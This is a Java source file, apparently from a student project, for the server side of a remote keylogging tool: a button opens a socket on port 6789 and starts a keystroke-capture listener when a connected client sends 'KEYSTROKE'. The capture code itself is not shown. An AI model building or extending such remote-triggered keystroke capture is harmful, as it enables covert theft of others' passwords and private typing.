
package controller;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.lang.Thread;

import javax.management.remote.JMXConnectorServer;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.plaf.basic.BasicListUI;

import program.ProgramSV;
import view.ServerDesign;
import model.KeyLog;
public class ServerListener implements ActionListener{
	private ServerDesign serverDesign;
	public ServerListener(ServerDesign serverDesign) {
		this.serverDesign = serverDesign;
	}
	
	@Override
	public void actionPerformed(ActionEvent e) {
		// TODO Auto-generated method stub
		// String click = e.getActionCommand();
		try {
            int port = 6789;
            ProgramSV.server = new ServerSocket(port); 
      
                    try {
                        Socket server = ProgramSV.server.accept();
                        JOptionPane.showMessageDialog(null, "Connected successfully!");
                        
                        
                        while (true) {
                        	
                    		ProgramSV.in = new BufferedReader(new InputStreamReader(server.getInputStream()));
                            ProgramSV.out = new BufferedWriter(new OutputStreamWriter(server.getOutputStream()));
                    		
                            String requestLine = ProgramSV.in.readLine();
                            
                            //Nếu nhận được KEYSTROKE thì bắt đầu bắt phím bằng KeyLogListenner
                            if ("KEYSTROKE".equals(requestLine)) {
                            	  JOptionPane.showMessageDialog(null, "KeyStroke!");
                            	  new KeyLogListener();
                            } 
                            else if("EXIT".equals(requestLine))
                            {
                            	ProgramSV.server.close();
                            }
                    		}
                    } catch (Exception e1){
                        e1.printStackTrace();
            			JOptionPane.showMessageDialog(null, "Error!");
                    }    
            
           
         
        } catch (Exception e1) {
            JOptionPane.showMessageDialog(null, "Error: " + e1.getMessage());
            e1.printStackTrace();
        }
		
		
		
	}
}	